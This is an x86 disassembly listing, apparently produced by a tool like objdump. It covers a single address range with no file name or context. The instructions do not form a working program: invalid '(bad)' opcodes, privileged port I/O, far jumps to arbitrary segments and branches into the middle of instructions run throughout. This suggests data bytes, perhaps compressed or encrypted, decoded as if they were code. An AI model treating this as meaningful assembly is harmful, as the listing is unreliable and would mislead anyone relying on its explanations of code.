  4132de:	adc    eax,DWORD PTR [edx]
  4132e0:	jne    0x4132e2
  4132e2:	jge    0x41331e
  4132e4:	fs pop es
  4132e6:	pop    es
  4132e7:	pop    eax
  4132e8:	mov    edx,0xaf069522
  4132ed:	push   0x37
  4132ef:	repz int3 
  4132f1:	stos   DWORD PTR es:[edi],eax
  4132f2:	add    DWORD PTR [edi+0x3b],0xa520b5b1
  4132f9:	pop    edi
  4132fa:	loope  0x4132b1
  4132fc:	xchg   ebp,ebp
  4132fe:	mov    eax,ds:0xdf37de9a
  413303:	inc    ebp
  413304:	in     eax,0x10
  413306:	jmp    0x4132a2
  413308:	bnd js 0x413290
  41330b:	push   0xe97bdded
  413310:	addr16 cwde 
  413312:	sbb    esp,DWORD PTR [esi]
  413314:	nop
  413315:	add    al,0x8
  413317:	and    DWORD PTR [ebx+0xf173cb6],ebx
  41331d:	sar    dh,cl
  41331f:	push   ebx
  413320:	ret    
  413321:	cmc    
  413322:	mov    DWORD PTR [edi],esp
  413324:	xor    BYTE PTR [ebx-0x69b88836],bl
  41332a:	mov    eax,ds:0x88d21473
  41332f:	cmp    bl,BYTE PTR [esi+0xb]
  413332:	mov    ebp,0x1f1e61e2
  413337:	outs   dx,BYTE PTR ds:[esi]
  413338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413339:	out    dx,eax
  41333a:	push   ebp
  41333b:	pop    es
  41333c:	xchg   BYTE PTR [ebx-0x1d0edd04],cl
  413342:	stc    
  413343:	sub    dl,BYTE PTR [ecx-0x7b]
  413346:	data16 mov dl,0xd3
  413349:	addr16 sbb ch,cl
  41334c:	mov    ds:0x6dd4f41a,al
  413351:	stos   DWORD PTR es:[edi],eax
  413352:	ret    
  413353:	(bad)  
  413354:	xor    al,0xec
  413356:	addr16 mov bl,0xda
  413359:	repz loopne 0x4133b1
  41335c:	xchg   ecx,eax
  41335d:	and    BYTE PTR [edi],ah
  41335f:	mov    al,ds:0xd27221f9
  413364:	les    ebp,FWORD PTR es:0xaa753038
  41336b:	pop    ecx
  41336c:	cmp    eax,edi
  41336e:	or     al,0xd7
  413370:	mov    edi,0x8637f782
  413375:	or     eax,0x1eff8b79
  41337a:	test   al,0xbd
  41337c:	fsub   QWORD PTR [edx+0x176f9808]
  413382:	xlat   BYTE PTR ds:[ebx]
  413383:	inc    ecx
  413384:	pop    edi
  413385:	sbb    dh,0x70
  413388:	push   ecx
  413389:	ror    DWORD PTR [eax+0x3],cl
  41338c:	cld    
  41338d:	xchg   ecx,eax
  41338e:	mov    cl,0x59
  413390:	das    
  413391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413392:	leave  
  413393:	shr    BYTE PTR [esi+0x42],0x2c
  413397:	dec    DWORD PTR [ebx+0x20]
  41339a:	xor    DWORD PTR [ecx],eax
  41339c:	stos   DWORD PTR es:[edi],eax
  41339d:	imul   edx,DWORD PTR [esi-0x44],0x23003e90
  4133a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a5:	ja     0x413382
  4133a7:	mov    ds:0x15ec36b8,al
  4133ac:	push   ss
  4133ad:	jns    0x41335a
  4133af:	imul   edx,DWORD PTR [eax*8+0x27175c5a],0xffffffa2
  4133b7:	pop    ss
  4133b8:	xor    bh,bh
  4133ba:	outs   dx,DWORD PTR ds:[esi]
  4133bb:	xchg   ebp,eax
  4133bc:	lock jp 0x413345
  4133bf:	not    BYTE PTR [ecx-0x4ef91ecf]
  4133c5:	adc    BYTE PTR [edx+0x2e0b78c3],bh
  4133cb:	test   DWORD PTR [ebx],esi
  4133cd:	push   esi
  4133ce:	lock sbb DWORD PTR [eax-0x5d1ee4b2],ebx
  4133d5:	rcr    BYTE PTR ds:0xd30bd22c,cl
  4133db:	and    DWORD PTR [ecx-0x3],ecx
  4133de:	es cli 
  4133e0:	push   ebp
  4133e1:	jmp    0xceec:0x8b916808
  4133e8:	sub    eax,0x477ea204
  4133ed:	jnp    0x413437
  4133ef:	jo     0x413395
  4133f1:	gs into 
  4133f3:	sahf   
  4133f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133f5:	sbb    BYTE PTR [ebx+0x40b0ae48],0x6d
  4133fc:	inc    esi
  4133fd:	inc    ebx
  4133fe:	xor    al,0xb5
  413400:	sub    bl,dh
  413402:	rol    BYTE PTR [edi+0x2c],0xcc
  413406:	mov    ebp,0x7b990d63
  41340b:	icebp  
  41340c:	aam    0xdf
  41340e:	(bad)  
  41340f:	jmp    0xf71d8156
  413414:	pop    esi
  413415:	dec    esp
  413416:	sbb    ah,dh
  413418:	jns    0x413408
  41341a:	(bad)  
  41341b:	in     eax,dx
  41341c:	mov    DWORD PTR [ebx],ebp
  41341e:	mov    cs,ecx
  413420:	pusha  
  413421:	sub    DWORD PTR [di-0x72],ebp
  413425:	pop    ecx
  413426:	aam    0x95
  413428:	and    DWORD PTR [esi-0x4c9bcc10],0xe
  41342f:	repz cld 
  413431:	inc    edi
  413432:	pop    ss
  413433:	int    0xf4
  413435:	div    BYTE PTR [eax]
  413437:	inc    ebp
  413438:	jecxz  0x413458
  41343a:	out    0x59,al
  41343c:	dec    edx
  41343d:	mov    edi,0xa0aea1dc
  413442:	int3   
  413443:	imul   ecx,DWORD PTR [ebp+0x2629cfee],0xffffffa1
  41344a:	adc    eax,0xa69f4184
  41344f:	(bad)  
  413450:	jge    0x4133e2
  413452:	adc    eax,ebp
  413454:	jne    0x4134a9
  413456:	fimul  DWORD PTR [edx+0x59a47c11]
  41345c:	ror    BYTE PTR [edi+0x42],0x95
  413460:	xor    BYTE PTR [ebx],ah
  413462:	nop
  413463:	push   ss
  413464:	jo     0x4133ff
  413466:	mov    ecx,0x16e9e3c8
  41346b:	in     al,0xc9
  41346d:	and    BYTE PTR [ecx],ch
  41346f:	xchg   eax,edi
  413471:	push   ds
  413472:	mov    gs,esi
  413474:	jno    0x41347c
  413476:	mov    ah,BYTE PTR [ebx+0x2a7fdfd0]
  41347c:	adc    DWORD PTR [eax],ebx
  41347e:	(bad)  
  41347f:	cmc    
  413480:	sub    ebx,eax
  413482:	aad    0x3c
  413484:	js     0x413407
  413486:	stc    
  413487:	cmp    al,0x9d
  413489:	jne    0x41344c
  41348b:	ins    DWORD PTR es:[edi],dx
  41348c:	repnz inc eax
  41348e:	dec    eax
  41348f:	lds    edx,FWORD PTR [ebp+0x7f453dbd]
  413495:	xor    al,0x83
  413497:	mov    edx,0xcd1433f5
  41349c:	repz cmp cl,dh
  41349f:	xchg   ebp,eax
  4134a0:	jae    0x413431
  4134a2:	inc    esp
  4134a3:	stos   DWORD PTR es:[edi],eax
  4134a4:	stos   DWORD PTR es:[edi],eax
  4134a5:	push   ebx
  4134a6:	add    bl,ah
  4134a8:	ins    DWORD PTR es:[edi],dx
  4134a9:	cmc    
  4134aa:	sub    al,0xae
  4134ac:	pop    eax
  4134ad:	enter  0x1544,0x9b
  4134b1:	mov    ds:0xef88ee6c,eax
  4134b6:	pop    ebp
  4134b7:	call   0xb397b701
  4134bc:	xchg   BYTE PTR [edx+0x34],al
  4134bf:	in     eax,dx
  4134c0:	cmp    DWORD PTR ds:0x5ecbf063,eax
  4134c6:	cs push 0xdce2b8d9
  4134cc:	push   eax
  4134cd:	jmp    0x4134c2
  4134cf:	push   esi
  4134d0:	adc    eax,0x5d11d991
  4134d5:	mov    ah,0x5c
  4134d7:	retf   0x1cee
  4134da:	sub    al,0x5b
  4134dc:	xor    BYTE PTR [ecx-0x4],ah
  4134df:	call   0x46ca:0x5c07698d
  4134e6:	das    
  4134e7:	sahf   
  4134e8:	or     BYTE PTR [eax+eax*2-0x50],dh
  4134ec:	pop    edi
  4134ed:	not    DWORD PTR [esi-0x65]
  4134f0:	out    0x1,al
  4134f2:	inc    eax
  4134f3:	pop    ebx
  4134f4:	inc    edi
  4134f5:	(bad)  
  4134f6:	pop    ebp
  4134f7:	dec    edi
  4134f8:	js     0x41356e
  4134fa:	jge    0x4134d8
  4134fc:	adc    DWORD PTR [ecx+0x7],esp
  4134ff:	test   DWORD PTR [esp+esi*8+0x4ca9999b],esi
  413506:	jo     0x413498
  413508:	sbb    ch,bh
  41350a:	test   DWORD PTR [ebx+edx*2-0x6f8fdca3],edi
  413511:	push   eax
  413512:	pop    esi
  413513:	data16 sbb BYTE PTR [ebp+0x73],ch
  413517:	inc    edx
  413518:	jne    0x4134f1
  41351a:	aam    0x35
  41351c:	and    DWORD PTR [ebp-0x2e],esp
  41351f:	cdq    
  413520:	clc    
  413521:	aad    0x43
  413523:	fisttp QWORD PTR [ecx+0x2415223a]
  413529:	xchg   edi,eax
  41352a:	std    
  41352b:	adc    eax,0xbd96d6b7
  413530:	ret    0x16b8
  413533:	dec    ebx
  413534:	loope  0x413586
  413536:	jne    0x4134d5
  413538:	jns    0x413515
  41353a:	fneni(8087 only) 
  41353c:	add    eax,0x76537b24
  413541:	mul    bh
  413543:	mov    ds:0xc1c149c1,eax
  413548:	dec    edi
  413549:	xchg   esi,eax
  41354a:	jle    0x413516
  41354c:	cmp    ebx,ebx
  41354e:	sbb    eax,DWORD PTR [edi+0x22c18517]
  413554:	in     eax,0x57
  413556:	loopne 0x413537
  413558:	inc    esi
  413559:	jp     0x41359d
  41355b:	mov    esp,0xbe5f00e9
  413560:	ror    BYTE PTR [edi+0x6],cl
  413563:	les    eax,FWORD PTR [edx+edx*4-0x53]
  413567:	pusha  
  413568:	jno    0x413554
  41356a:	(bad)  
  41356b:	call   0x6225a5de
  413570:	inc    esi
  413571:	add    BYTE PTR [ebx],dh
  413573:	outs   dx,BYTE PTR ds:[esi]
  413574:	sbb    DWORD PTR [ecx-0x35],esi
  413577:	or     BYTE PTR [esi],ch
  413579:	dec    edi
  41357a:	inc    edx
  41357b:	test   al,0x8
  41357d:	cmp    DWORD PTR [ebx+0x32],0x77
  413581:	fnstcw WORD PTR [ebx]
  413583:	out    0xb9,eax
  413585:	ficom  DWORD PTR [esp+ecx*2-0x64fe9d38]
  41358c:	mov    al,ah
  41358e:	in     eax,dx
  41358f:	repz loopne 0x4135e0
  413592:	mov    esi,0x88d23734
  413597:	push   es
  413598:	sub    al,0x8e
  41359a:	cmp    al,ch
  41359c:	sub    bl,ah
  41359e:	lea    ebx,[edi]
  4135a0:	dec    ebx
  4135a1:	and    al,0xf9
  4135a3:	mov    ah,0x95
  4135a5:	jb     0x413621
  4135a7:	add    al,0x83
  4135a9:	test   dh,dl
  4135ab:	out    0x4c,al
  4135ad:	inc    edx
  4135ae:	sub    ebp,edx
  4135b0:	out    dx,al
  4135b1:	ja     0x413539
  4135b3:	pop    esi
  4135b4:	add    DWORD PTR [esi+0x2e],ebx
  4135b7:	aaa    
  4135b8:	leave  
  4135b9:	mov    WORD PTR [ebx+0x73498f43],gs
  4135bf:	lahf   
  4135c0:	hlt    
  4135c1:	mov    cl,0x91
  4135c3:	mov    ecx,DWORD PTR [edx+0x7c857567]
  4135c9:	in     eax,dx
  4135ca:	mov    al,0x19
  4135cc:	push   edi
  4135cd:	shl    BYTE PTR ds:0xcf1ea89e,cl
  4135d3:	or     al,bh
  4135d5:	mov    ebx,0xf065978a
  4135da:	inc    esi
  4135db:	mov    dh,bh
  4135dd:	fdivr  QWORD PTR [esi+0x9733d52]
  4135e3:	fst    QWORD PTR [edx-0x4e1d0bd5]
  4135e9:	sub    dh,0x0
  4135ec:	push   ebx
  4135ed:	in     al,0x90
  4135ef:	pop    ds
  4135f0:	add    eax,0x27010706
  4135f5:	cmp    ecx,ecx
  4135f7:	sbb    DWORD PTR [esi+0x55d89c6a],edx
  4135fd:	jl     0x41359a
  4135ff:	xchg   edx,eax
  413600:	in     al,dx
  413601:	and    ecx,DWORD PTR [edi+0x65]
  413604:	xchg   esp,eax
  413605:	arpl   WORD PTR [edx+0x10],di
  413608:	daa    
  413609:	cmp    DWORD PTR [ebx],edi
  41360b:	fisttp WORD PTR [ecx+0x34]
  41360e:	loop   0x413635
  413610:	out    dx,eax
  413611:	lahf   
  413612:	cmp    esi,DWORD PTR [edi-0x40555d7c]
  413618:	sbb    al,0x68
  41361a:	scas   al,BYTE PTR es:[edi]
  41361b:	mov    edx,0x97d34b31
  413620:	or     ch,al
  413622:	jge    0x413652
  413624:	ins    BYTE PTR es:[edi],dx
  413625:	or     eax,0x7b7054c
  41362a:	outs   dx,DWORD PTR ds:[esi]
  41362b:	test   eax,0x1a0b6f14
  413630:	and    BYTE PTR [ebp+0x61],al
  413633:	xchg   ebx,eax
  413634:	dec    ebx
  413635:	les    ebx,FWORD PTR [ebx+edi*2+0x46]
  413639:	pop    ebp
  41363a:	jg     0x4135f8
  41363c:	mov    ebx,0xe5903510
  413641:	dec    ebp
  413642:	mov    edi,0xc8168847
  413647:	mov    esi,esp
  413649:	dec    eax
  41364a:	aas    
  41364b:	lahf   
  41364c:	cmp    al,0xd0
  41364e:	cmp    BYTE PTR [ecx-0x2f82a41d],ch
  413654:	push   ebp
  413655:	in     al,0x91
  413657:	in     eax,dx
  413658:	push   cs
  413659:	mov    ebx,0x10edb9f
  41365e:	stc    
  41365f:	pusha  
  413660:	shl    BYTE PTR [esp+ebx*4+0x71],0x6
  413665:	retf   
  413666:	loopne 0x413673
  413668:	(bad)  
  413669:	mul    DWORD PTR [ebp+0x63cba974]
  41366f:	mov    edi,esi
  413671:	les    edx,FWORD PTR [eax-0x11]
  413674:	ja     0x4136c5
  413676:	js     0x413601
  413678:	pop    ecx
  413679:	iret   
  41367a:	repz mov bl,0xf2
  41367d:	pusha  
  41367e:	stc    
  41367f:	or     esi,DWORD PTR [edx+0x34f4b6f]
  413685:	mov    edx,0x23666ff3
  41368a:	xlat   BYTE PTR ds:[ebx]
  41368b:	lds    esi,FWORD PTR [ecx+0x2d]
  41368e:	pop    edx
  41368f:	mov    ds:0x3831db98,al
  413694:	xchg   edi,eax
  413695:	mov    ebx,0xe6a14123
  41369a:	or     ch,BYTE PTR [esi+eax*2+0x75e74a81]
  4136a1:	xlat   BYTE PTR ds:[ebx]
  4136a2:	shr    DWORD PTR [edx-0x57],1
  4136a5:	test   eax,0xf8dd3805
  4136aa:	cmp    DWORD PTR [edx+0x1aae1284],edx
  4136b0:	xor    al,0xc
  4136b2:	xchg   edx,eax
  4136b3:	je     0x4136c6
  4136b5:	jge    0x4136b7
  4136b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136b8:	addr16 adc eax,0x38ec5cc1
  4136be:	jno    0x413737
  4136c0:	and    eax,0xb7018989
  4136c5:	rcl    BYTE PTR [ebp-0x11145203],1
  4136cb:	inc    esp
  4136cc:	pop    esp
  4136cd:	mov    cl,BYTE PTR [eax+0x4a]
  4136d0:	call   0x6a8e:0xdf9f25c7
  4136d7:	daa    
  4136d8:	push   ebp
  4136d9:	aam    0xf5
  4136db:	xor    al,0xa3
  4136dd:	pop    esp
  4136de:	inc    ecx
  4136df:	and    ebp,DWORD PTR [ebx-0x31904437]
  4136e5:	mov    dh,0x6f
  4136e7:	sbb    eax,0x2391e0e7
  4136ec:	xchg   edi,eax
  4136ed:	std    
  4136ee:	popa   
  4136ef:	dec    esp
  4136f0:	jo     0x4136b1
  4136f2:	gs xchg bx,ax
  4136f5:	jbe    0x4136e3
  4136f7:	mov    edi,0x85863125
  4136fc:	adc    esp,esi
  4136fe:	add    DWORD PTR [ebp+0x2ae21c8],edx
  413704:	in     eax,0xfa
  413706:	clc    
  413707:	push   edi
  413708:	inc    edi
  413709:	add    esp,DWORD PTR [edx+0x8]
  41370c:	loop   0x4136e9
  41370e:	mov    ds:0xe246330f,eax
  413713:	std    
  413714:	sbb    edi,DWORD PTR [esi+0x45]
  413717:	mov    ds:0xecf71986,eax
  41371c:	xchg   edi,eax
  41371d:	sahf   
  41371e:	xor    edi,DWORD PTR [ecx+0xa9af37d]
  413724:	std    
  413725:	ret    0x32ae
  413728:	into   
  413729:	mov    cl,al
  41372b:	mov    esp,0x726a1a16
  413730:	push   ds
  413731:	xor    DWORD PTR [ecx+eax*2-0x7a],ebp
  413735:	mov    WORD PTR [ebx],?
  413737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413738:	mov    cl,0x30
  41373a:	arpl   WORD PTR [edx+0x5c04e7c],dx
  413740:	out    dx,al
  413741:	test   BYTE PTR [eax-0x7800ee4e],cl
  413747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413748:	add    BYTE PTR [eax+0x0],al
  41374b:	mov    ah,dl
  41374d:	adc    al,0x4e
  41374f:	retf   
  413750:	cdq    
  413751:	data16 sahf 
  413753:	cmp    al,0x81
  413755:	mov    ecx,0x42507025
  41375a:	daa    
  41375b:	push   esi
  41375c:	icebp  
  41375d:	mov    bl,0xf6
  41375f:	push   edi
  413760:	xchg   al,bl
  413762:	push   edx
  413763:	out    dx,al
  413764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413765:	xchg   ebx,eax
  413766:	push   ebp
  413767:	shl    BYTE PTR [edi],1
  413769:	int    0xa5
  41376b:	and    BYTE PTR [ebx+0x66255597],al
  413771:	jmp    0x32b9:0x4a220555
  413778:	xor    al,0xbb
  41377a:	fwait
  41377b:	cli    
  41377c:	and    DWORD PTR [ecx],edx
  41377e:	and    DWORD PTR [ebp-0x23c09d09],edx
  413784:	xchg   ebx,eax
  413785:	xchg   esi,eax
  413786:	add    eax,0x3b62ef48
  41378b:	lock cs jb 0x41373c
  41378f:	fdiv   st(2),st
  413791:	add    DWORD PTR [edx-0x7c],0x9886e8b4
  413798:	or     eax,0x2006e2a1
  41379d:	pop    esi
  41379e:	xor    al,BYTE PTR [eax+ebx*8+0x54859ab9]
  4137a5:	adc    DWORD PTR [edx],eax
  4137a7:	xor    eax,0xd972a009
  4137ac:	pop    ss
  4137ad:	mov    ah,0x50
  4137af:	push   ebp
  4137b0:	sar    BYTE PTR [esi],1
  4137b2:	mov    DWORD PTR [ebx+0x1f99bb8d],edx
  4137b8:	out    0x1f,al
  4137ba:	daa    
  4137bb:	jbe    0x4137d1
  4137bd:	lahf   
  4137be:	stos   DWORD PTR es:[edi],eax
  4137bf:	xchg   esp,eax
  4137c0:	pusha  
  4137c1:	jge    0x413832
  4137c3:	test   eax,0x40b06236
  4137c8:	arpl   WORD PTR [edx],sp
  4137ca:	ins    DWORD PTR es:[edi],dx
  4137cb:	outs   dx,DWORD PTR ds:[esi]
  4137cc:	xchg   ecx,eax
  4137cd:	dec    ebx
  4137ce:	and    BYTE PTR [eax-0x318c3268],ah
  4137d4:	push   es
  4137d5:	loopne 0x413814
  4137d7:	mov    ebp,0xef2faed2
  4137dc:	ins    BYTE PTR es:[edi],dx
  4137dd:	cmc    
  4137de:	int    0x48
  4137e0:	inc    edx
  4137e1:	sti    
  4137e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137e3:	ds lahf 
  4137e5:	mov    bh,0x2f
  4137e7:	xor    ah,dl
  4137e9:	scas   al,BYTE PTR es:[edi]
  4137ea:	push   ebx
  4137eb:	xchg   ecx,eax
  4137ec:	mov    ebp,0xa6a21522
  4137f1:	jns    0x413824
  4137f3:	cs adc eax,0xce151a8c
  4137f9:	pop    ss
  4137fa:	dec    esi
  4137fb:	dec    edx
  4137fc:	jbe    0x41386f
  4137fe:	in     eax,dx
  4137ff:	cmova  ebx,DWORD PTR ds:0x28544fa5
  413806:	pop    edi
  413807:	push   ds
  413808:	in     eax,dx
  413809:	adc    edx,0xd59935e2
  41380f:	mov    eax,ds:0x87ff3ded
  413814:	inc    esi
  413815:	inc    ebp
  413816:	inc    ebp
  413817:	jnp    0x413850
  413819:	fadd   DWORD PTR [edx+0x515411ef]
  41381f:	push   ebp
  413820:	mov    ah,0xfe
  413822:	or     eax,0x9e4cbffe
  413827:	or     DWORD PTR [edx-0x80],edi
  41382a:	mov    edx,0xfe9cee6d
  41382f:	mov    al,0xf6
  413831:	in     eax,dx
  413832:	std    
  413833:	cmp    al,0xbe
  413835:	aam    0xe7
  413837:	leave  
  413838:	ins    DWORD PTR es:[edi],dx
  413839:	dec    edi
  41383a:	ret    
  41383b:	sti    
  41383c:	jno    0x4137f4
  41383e:	mov    ah,0x23
  413840:	outs   dx,BYTE PTR ds:[esi]
  413841:	out    0x88,al
  413843:	jno    0x41383b
  413845:	ss ja  0x4138c2
  413848:	lahf   
  413849:	cs and al,0x5e
  41384c:	inc    esi
  41384d:	in     al,dx
  41384e:	(bad)
  413852:	shl    esi,0xc
  413855:	retf   0xaaf2
  413858:	push   ebp
  413859:	adc    dh,BYTE PTR ds:0x90557d82
  41385f:	test   al,0x9b
  413861:	xor    cl,BYTE PTR [edi]
  413863:	or     ebp,DWORD PTR [ecx]
  413865:	jnp    0x413840
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	ret    0x56d5
  41386b:	push   es
  41386c:	push   esi
  41386d:	inc    esp
  41386e:	sbb    bl,cl
  413870:	mov    DWORD PTR [ebx],edi
  413872:	daa    
  413873:	iret   
  413874:	jb     0x4138df
  413876:	push   0xa0ebf3e3
  41387b:	push   0xffffffbc
  41387d:	scas   al,BYTE PTR es:[edi]
  41387e:	jl     0x413824
  413880:	loope  0x413901
  413882:	fist   DWORD PTR [eax]
  413884:	pop    esp
  413885:	add    al,0x18
  413887:	pushf  
  413888:	mov    edi,0x2db7dad3
  41388d:	mov    ch,0x4f
  41388f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413890:	imul   esp,DWORD PTR [edi+0x4d],0x44a543
  413897:	xchg   ecx,eax
  413898:	lods   al,BYTE PTR gs:[esi]
  41389a:	arpl   WORD PTR [esi],ax
  41389c:	and    bl,BYTE PTR [ebx+0x32]
  41389f:	icebp  
  4138a0:	out    0x65,al
  4138a2:	xlat   BYTE PTR ds:[ebx]
  4138a3:	and    esi,DWORD PTR [esi+0x76]
  4138a6:	lock pop es
  4138a8:	adc    BYTE PTR [ecx+0x56dd0587],ah
  4138ae:	or     al,0xad
  4138b0:	adc    DWORD PTR [ebx],0x7005b3fa
  4138b6:	(bad)  
  4138b8:	aad    0x35
  4138ba:	push   0xf245410e
  4138bf:	in     al,dx
  4138c0:	push   esp
  4138c1:	inc    di
  4138c3:	nop
  4138c4:	dec    edx
  4138c5:	test   eax,0xa55bb553
  4138ca:	test   edi,esp
  4138cc:	add    dh,BYTE PTR [ebx-0x5c]
  4138cf:	(bad)  
  4138d0:	hlt    
  4138d1:	jmp    0x3145f43e
  4138d6:	adc    eax,0xe20584a
  4138db:	icebp  
  4138dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138dd:	fcomp  DWORD PTR [ebp-0x9d63776]
  4138e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138e4:	fwait
  4138e5:	pop    esp
  4138e6:	bound  ebx,QWORD PTR [edi]
  4138e8:	js     0x413916
  4138ea:	dec    ecx
  4138eb:	rdmsr  
  4138ed:	adc    dl,BYTE PTR [ecx-0x9]
  4138f0:	dec    esi
  4138f1:	cmp    al,BYTE PTR [ebx]
  4138f3:	xor    ch,BYTE PTR [ebx+0x66a81137]
  4138f9:	repnz mov dh,0xd4
  4138fc:	out    0x36,eax
  4138fe:	mov    edx,0x71b4e46f
  413903:	pop    esp
  413904:	fdiv   st,st(3)
  413906:	mov    al,0xc
  413908:	(bad)  
  413909:	ds xor al,0x6c
  41390c:	enter  0xbf2d,0xd2
  413910:	sbb    edx,esp
  413912:	icebp  
  413913:	sbb    dl,al
  413915:	xchg   edx,eax
  413916:	add    al,0xdf
  413918:	or     eax,0x122f0f5
  41391d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41391e:	dec    esp
  41391f:	stc    
  413920:	loopne 0x41394d
  413922:	test   eax,0xefc27c21
  413927:	sbb    ecx,ebx
  413929:	cdq    
  41392a:	adc    al,0xb
  41392c:	xchg   DWORD PTR [ebp-0x60f9e121],ebx
  413932:	inc    edi
  413933:	jns    0x4139b3
  413935:	aam    0xaa
  413937:	icebp  
  413938:	in     al,dx
  413939:	loope  0x413912
  41393b:	sub    DWORD PTR [eax+0x1c956aff],ebp
  413941:	jle    0x4138d6
  413943:	lods   eax,DWORD PTR ds:[esi]
  413944:	scas   eax,DWORD PTR es:[edi]
  413945:	ja     0x4139a3
  413947:	inc    DWORD PTR [ecx-0x75bb15cb]
  41394d:	push   ss
  41394e:	retf   0x45bc
  413951:	mov    esi,0x26bc0e69
  413956:	mov    edx,0xae445021
  41395b:	or     BYTE PTR [eax-0x5894d8ac],bl
  413961:	cdq    
  413962:	or     DWORD PTR [edx],eax
  413964:	xchg   cl,dl
  413966:	add    eax,0x56750ae1
  41396b:	call   0xb98b:0xa3e36dec
  413972:	sub    BYTE PTR [edx-0x14],ah
  413975:	sub    DWORD PTR [esi],eax
  413977:	xchg   ebx,eax
  413978:	loopne 0x41399c
  41397a:	push   cs
  41397b:	scas   eax,DWORD PTR es:[edi]
  41397c:	das    
  41397d:	mov    es:0xdc9651f0,eax
  413983:	inc    DWORD PTR [edi]
  413985:	retf   
  413986:	adc    eax,0xe5515781
  41398c:	pop    ss
  41398d:	add    ecx,esi
  41398f:	push   cs
  413990:	out    dx,al
  413991:	imul   ebp,DWORD PTR [ecx+edx*2-0x4da8a68d],0x99b8f32a
  41399c:	loop   0x4139a1
  41399e:	mov    dl,0x63
  4139a0:	add    eax,0x5ecb967a
  4139a5:	adc    eax,0x2b0be8b1
  4139aa:	mov    bh,0xff
  4139ac:	dec    edi
  4139ad:	aas    
  4139ae:	cmp    dh,0x11
  4139b1:	cmp    eax,0xff4dcdf9
  4139b6:	sbb    DWORD PTR [eax-0x45cb2ae9],0x34
  4139bd:	retf   0xa596
  4139c0:	cmc    
  4139c1:	mov    eax,ds:0x29569123
  4139c6:	pop    ebp
  4139c7:	int    0xb1
  4139c9:	inc    ebx
  4139ca:	fbstp  TBYTE PTR [ecx]
  4139cc:	push   esi
  4139cd:	xchg   edi,eax
  4139ce:	or     edx,DWORD PTR [ebx]
  4139d0:	xchg   ecx,eax
  4139d1:	repnz mov esi,0x7186ad1d
  4139d7:	sbb    eax,0xd9ba5095
  4139dc:	jg     0x413a08
  4139de:	cmp    ecx,DWORD PTR [ebx+0x5f6ac7ad]
  4139e4:	mov    al,ds:0xeaca602c
  4139e9:	pop    ebx
  4139ea:	and    ebp,DWORD PTR [ecx-0x5f19fcb2]
  4139f0:	dec    edx
  4139f1:	cmp    al,0x2
  4139f3:	push   esp
  4139f4:	xchg   esp,eax
  4139f5:	cli    
  4139f6:	test   DWORD PTR [ecx-0x3076a456],ebx
  4139fc:	mov    DWORD PTR [edx+0x7a],eax
  4139ff:	stos   DWORD PTR es:[edi],eax
  413a00:	loopne 0x413a4c
  413a02:	mov    al,0x9e
  413a04:	sti    
  413a05:	inc    ebp
  413a06:	cmp    DWORD PTR [eax+0x6be3747e],ebp
  413a0c:	sub    al,0x11
  413a0e:	push   ecx
  413a0f:	xchg   ebp,eax
  413a10:	mov    ch,0x94
  413a12:	xchg   DWORD PTR [edx-0x1918397a],esi
  413a18:	xchg   ebp,eax
  413a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1a:	shr    BYTE PTR [ecx+0x756723c1],0x3d
  413a21:	in     al,dx
  413a22:	and    al,0x2e
  413a24:	aad    0x67
  413a26:	(bad)  
  413a27:	adc    BYTE PTR [ebp-0x1830a172],bl
  413a2d:	int3   
  413a2e:	dec    esp
  413a2f:	int3   
  413a30:	push   esi
  413a31:	ds xchg edi,eax
  413a33:	cs lahf 
  413a35:	rcl    BYTE PTR [edx-0x2c],cl
  413a38:	leave  
  413a39:	xchg   ecx,eax
  413a3a:	pop    edx
  413a3b:	popa   
  413a3c:	jecxz  0x4139e3
  413a3e:	xchg   esp,eax
  413a3f:	sub    BYTE PTR [edx],0xe5
  413a42:	mov    bl,0x56
  413a44:	push   ds
  413a45:	pop    ecx
  413a46:	test   eax,0x24d48399
  413a4b:	dec    edi
  413a4c:	mov    bl,0x2c
  413a4e:	(bad)  
  413a4f:	push   ecx
  413a50:	stos   BYTE PTR es:[edi],al
  413a51:	adc    al,0xf4
  413a53:	mov    cl,BYTE PTR [esi-0x52]
  413a56:	das    
  413a57:	mov    ds:0xbdcb57c4,eax
  413a5c:	fild   QWORD PTR [ecx-0x262be79c]
  413a62:	ins    BYTE PTR es:[edi],dx
  413a63:	and    BYTE PTR [ebp+0x42],dl
  413a66:	idiv   DWORD PTR [eax-0x27255a5d]
  413a6c:	mov    edx,0xdbdc07e0
  413a72:	les    edx,FWORD PTR [edi+edx*1-0x72c12798]
  413a79:	mov    esp,0x6cd9609b
  413a7e:	inc    ecx
  413a7f:	popf   
  413a80:	sti    
  413a81:	cmp    eax,0x8b18e131
  413a86:	std    
  413a87:	inc    ebx
  413a88:	shr    ebp,0x48
  413a8b:	jmp    0x8f18:0x537a16ac
  413a92:	pop    edx
  413a93:	jle    0x413abf
  413a95:	fld    TBYTE PTR [edx+ebx*1]
  413a98:	fldcw  WORD PTR [ebx]
  413a9a:	test   al,0x62
  413a9c:	xchg   esp,eax
  413a9d:	mov    eax,0xc31c0bc9
  413aa2:	ins    DWORD PTR es:[edi],dx
  413aa3:	mov    eax,0xdaba5bef
  413aa8:	or     eax,0x11bc31f9
  413aad:	pop    esp
  413aae:	pop    edi
  413aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab0:	scas   al,BYTE PTR es:[edi]
  413ab1:	or     BYTE PTR [edx-0x41816af5],0x67
  413ab8:	lea    eax,[esi+0x25]
  413abb:	jno    0x413afa
  413abd:	es aas 
  413abf:	mov    BYTE PTR [ecx-0x31],ah
  413ac2:	mov    ss,ebp
  413ac4:	jbe    0x413b32
